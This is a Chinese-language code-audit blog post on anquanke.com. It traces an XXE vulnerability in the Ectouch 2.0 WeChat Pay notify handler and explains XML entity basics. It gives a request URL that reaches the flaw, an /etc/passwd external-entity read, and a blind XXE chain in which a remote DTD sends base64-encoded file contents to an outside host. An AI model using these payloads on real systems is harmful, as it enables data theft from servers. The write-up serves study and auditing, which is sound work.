# Ectouch2.0 分析代码审计流程 (五) xxe漏洞

阅读量 **321315**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-01-23 16:00:14

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/dm/1024_459_/t013c0ecb907d637952.jpg)

## 0x1 前言

​
不知不觉这个文章写到了第五篇,我感觉我写文章的热情有所下降了,对一些漏洞的说明也没有再从新手角度出发,其实我感觉要是一步一步看着文章过来,其实你就会发现这些东西真的没必要多讲。不过我却发现,可以多从漏洞层面进行下原理的讲解,let
us start。

## 0x2 xxe漏洞是什么？

​
这里推荐水泡泡师傅的一篇文章:[xxe漏洞的学习与利用总结](https://www.cnblogs.com/r00tuser/p/7255939.html),这里我简单概括下:

> 1.漏洞产生的位置: 解析xml格式类型文档的时候
>
> 2.漏洞的成因:文档可以引用外部实体
>
> 3.漏洞的危害:
>
> (1)读取任意文件(常用是这个)
>
> (2)探测内网端口
>
> (3)攻击内网网站

## 0x3 需要的xxe基础知识

(一)XML格式

主要由xml声明、文档类型定义(DTD)(重点关注下这个)、文档元素组成

    
    
    <?xml version="1.0"?> <!-- XML声明 -->
    <!DOCTYPE poem[ <!-- 文档类型定义 -->
        <!ELEMENT poem (author,title,content)>
        <!ELEMENT author (#PCDATA)>
        <!ELEMENT title (#PCDATA)>
        <!ELEMENT content (#PCDATA)>
    ]>
    <poem> <!-- 文档元素 -->
        <author>小七</author>
        <title>xxe漏洞</title>
        <content>xxe很easy</content>
    </poem>

上面那个是内部DTD,因为文档定义和文档元素写在了一个文件上

那么何为外部DTD呢

了解下文档定义语法:

同文件夹下:

poem.dtd:

    
    
        <!ELEMENT poem (author,title,content)>
        <!ELEMENT author (#PCDATA)>
        <!ELEMENT title (#PCDATA)> 
        <!ELEMENT content (#PCDATA)>
    
    
    <?xml version="1.0"?> <!-- XML声明 -->
    <!DOCTYPE poem SYSTEM "poem.dtd"> <!-- 外部DTD 对比上面发现多了system 然后替换了[]的内容-->
    <poem> <!-- 文档元素 -->
        <author>小七</author>
        <title>xxe漏洞</title>
        <content>xxe很easy</content>
    </poem>

何为实体? 简单理解就是变量,然后在xml文档去使用

    
    
    例子:
    <!ENTITY writer "xq17"> <!-- 内部实体声明语法 -->
    <author>&writer</author>
    
    
    <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd" > <!-- 外部实体声明语法 -->
    ]>
    <root>
        <name>&xxe;</name> <!-- 这样就可以导致任意文件读取并且回显  -->
    </root>

参考文章:[XML文件详解以及解析](https://blog.csdn.net/com_ma/article/details/73277535)

## 0x4 漏洞挖掘思路

> 搜索关键词 `simplexml_load_string`,然后再回溯分析

## 0x5 wxpay.php XXE漏洞

​ 由(3)可知:

![](https://ws1.sinaimg.cn/large/006tNc79gy1fzdipd6jvej30tg0f4tc1.jpg)

这是个支付插件,首先要去后台开启下微信支付

![](https://ws1.sinaimg.cn/large/006tNc79gy1fzdirmmrkej31d70u00wc.jpg)

点击确定后,就可以让我们来跟进wxpay.php文件了解下漏洞成因

    
    
      */
        public function notify($data)
        {
            $inputdata = file_get_contents("php://input"); //这里数据可控
            if (!empty($inputdata)) {
                $payment = model('Payment')->get_payment($data['code']);
                $postdata = json_decode(json_encode(simplexml_load_string($inputdata, 'SimpleXMLElement', LIBXML_NOCDATA)), true);//这里把可控数据传入了simplexml_load_string
                /* 检查插件文件是否存在，如果存在则验证支付是否成功，否则则返回失败信息 */
                // 微信端签名
                $wxsign = $postdata['sign'];
                unset($postdata['sign']);
    

然后寻找那里调用了`notify`函数,全局搜索该函数(限定为php)文件

![](https://ws1.sinaimg.cn/large/006tNc79gy1fzdwxmng7qj31e60a40v1.jpg)

选择跟进看是如何调用的:

`upload/mobile/include/apps/default/controllers/RespondController.class.php`

    
    
        public function index()
        {
            /* 判断是否启用 */
            $condition['pay_code'] = $this->data['code'];
            $condition['enabled'] = 1;
            $enabled = $this->model->table('payment')->where($condition)->count();
            if ($enabled == 0) {
                $msg = L('pay_disabled');
            } else {
                // 微信h5中间页面
                if (isset($_GET['style']) && $this->data['code'] == 'wxpay' && $_GET['style'] == 'wxh5') {
                    $log_id = intval($_GET['log_id']);
                    $url = url('respond/wxh5', array('code' => 'wxpay', 'log_id' => $log_id));
                    $this->redirect($url);
                }
    
                $plugin_file = ADDONS_PATH.'payment/' . $this->data['code'] . '.php';
                if (file_exists($plugin_file)) {
                    include_once($plugin_file);
                    $payobj = new $this->data['code']();
                    // 处理异步请求
                    if($this->data['type'] == 'notify'){//需要满足条件
                        @$payobj->notify($this->data);//在这里调用
                    }
                    $msg = (@$payobj->callback($this->data)) ? L('pay_success') : L('pay_fail');
                } else {
                    $msg = L('pay_not_exist');
                }
            }
    

很显然最靠近需要满足的条件是`if($this->data['type'] == 'notify')`

所以看看`data`数组能不能被控制

直接拉到最上面看类的定义

    
    
    class RespondController extends CommonController
    {
    
        private $data;
    
        public function __construct()
        {
            parent::__construct();
            // 获取参数
            $this->data = array(
                'code' => I('get.code'),//可控
                'type' => I('get.type')//可控
            );
        }
    

很明显可以控制进入到漏洞流程

然后中间就是一些满足条件了

    
    
            $condition['pay_code'] = $this->data['code']; 
            $condition['enabled'] = 1;
            $enabled = $this->model->table('payment')->where($condition)->count();
            if ($enabled == 0) {//判断支付方式是不是开启,设置支付方式为微信就可以了
                $msg = L('pay_disabled');
            } else {
                // 微信h5中间页面
                if (isset($_GET['style']) && $this->data['code'] == 'wxpay' && $_GET['style'] == 'wxh5') {//style!=wxh5就可以绕过了
                    $log_id = intval($_GET['log_id']);
                    $url = url('respond/wxh5', array('code' => 'wxpay', 'log_id' => $log_id));
                    $this->redirect($url);
                }
    
                $plugin_file = ADDONS_PATH.'payment/' . $this->data['code'] . '.php';
                if (file_exists($plugin_file)) {
                    include_once($plugin_file);
                    $payobj = new $this->data['code']();
    

大概流程已经出来了,下面分析下漏洞利用,首先说明下这里没有回显,是个blind类型的xxe

## 0x6 漏洞演示

​

为了方便演示,这里加了一句输出,xml解析的数据,来帮助我们进行漏洞验证,也不需要开启外部服务。

由上面分析构造出url:

`http://127.0.0.1:8888/ecshop/upload2/upload/mobile/?m=default&c=Respond&a=index&code=wxpay&type=notify&style=xxx`

然后post:

    
    
    <?xml version="1.0"?> 
    <!DOCTYPE foo [
    <!ENTITY xxe "xxe test">
    ]>
    <root><name>&xxe;</name></root>
    

![](https://ws3.sinaimg.cn/large/006tNc79gy1fzdy51nj6bj31j60j4jxc.jpg)

很明显解析了实体引用,又因为

没有设置`libxml_disable_entity_loader(true);`,导致可以外部引用。

关于如何利用blind xxe盲注,可以看我下面面所讲,然后自己操作一遍。

## 0x7 blind xxe利用原理

原理分析:

​ 利用参数实体获取到文件内容,然后带着内容走http协议去访问我们的接收端

一些小知识:

定义参数实体的语法:

`<!ENTITY % name content>`

xxx.xml

`<!ENTITY % all "<!ENTITY send SYSTEM 'http://xxx/x.php?hs=%hs;'>">`

Payload

    
    
    <?xml version="1.0"?>
    <!DOCTYPE ANY [
        <!ENTITY % hs SYSTEM "file:///C:/1.txt"> <!-- 加载文件赋值给参数实体hs -->
        <!ENTITY % remote SYSTEM "http://xxx/xxx.xml">  
        %remote; <!-- 引入xml文件的实体定义 -->
        %all; 
    ]>
    <root>&send;</root>
    

其实等价:

    
    
    <?xml version="1.0"?>
    <!DOCTYPE ANY [
        <!ENTITY % hs SYSTEM "file:///C:/1.txt"> <!-- 加载文件赋值给参数实体hs -->
        <!ENTITY send SYSTEM 'http://xxx/x.php?hs=%hs;'> <!-- 引用了上面的参数实体 -->
    ]>
    <root>&send;</root>
    

但是xml解析器不支持在实体的定义在引用参数实体,所以我们做了个跳转,规避了错误

(命名实体+外部实体+参数实体写法)执行顺序是

**参数实体写法- >外部实体->命名实体->&调用发起请求**

具体利用:

evil.dtd:

    
    
    <!ENTITY % all "<!ENTITY send SYSTEM 'http://ham.exeye.io/?%file;'>">
    

payload:

    
    
    <?xml version="1.0"?>
    <!DOCTYPE ANY[
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/tmp/123.txt">
    <!ENTITY % remote SYSTEM "https://ham.exeye.io/evil.dtd">
    %remote;
    %all;
    ]>
    <root>&send;</root>
    

![](https://ws1.sinaimg.cn/large/006tNc79gy1fze2zdukblj31e00l6wkv.jpg)

![](https://ws1.sinaimg.cn/large/006tNc79gy1fze2zk2ltxj317s0bg74x.jpg)

参考文章:

[XML与xxe注入基础知识](https://www.cnblogs.com/backlion/p/9302528.html)

## 0x8 关于xxe在php的见解

    
    
    >xxe漏洞跟php版本无关,主要是libxml的扩展,libxml2.9之后默认不使用外部实体,需要加第三个
    >
    >`LIBXML_NOENT`参数才能利用
    >
    >当然解析xml还有其他方式,`simplexml_load_string`只是很常用的而已,只要是涉及解析xml的地方都可能存在,`
    >
    >比如`DOMDocument` 、`SimpleXMLElement`类等等。
    

本机默认环境PHP Version 5.5.38 libxml是安装2.8.0版的,所以是可以利用的。

## 0x9 感想

​
感觉这个cms漏洞挖的差不多了,之前看了下文件包含,没找到点,反序列化还没看过,不过我感觉变量覆盖、反序列化是中间环节不算漏洞,构造出攻击链才算漏洞,这也是很有意思的审计点,不过万事不能强求,Ectouch好歹也是电商网站又不是给我们写bug来学习代码审计的,后面如果没找到什么有趣的漏洞,为了这个系列完整性我也会去审计一些有其他漏洞的cms。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **xq17** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/169960](/post/id/169960)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [XXE](/tag/XXE)
  * [Web安全](/tag/Web安全)
  * [代码审计](/tag/代码审计)
  * [PHP](/tag/PHP)

 **+1** __0赞

 __收藏

![](https://q.qlogo.cn/qqapp/101431079/FB5738D77CCE7E738CDE1AA49ED6757A/40)
xq17

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

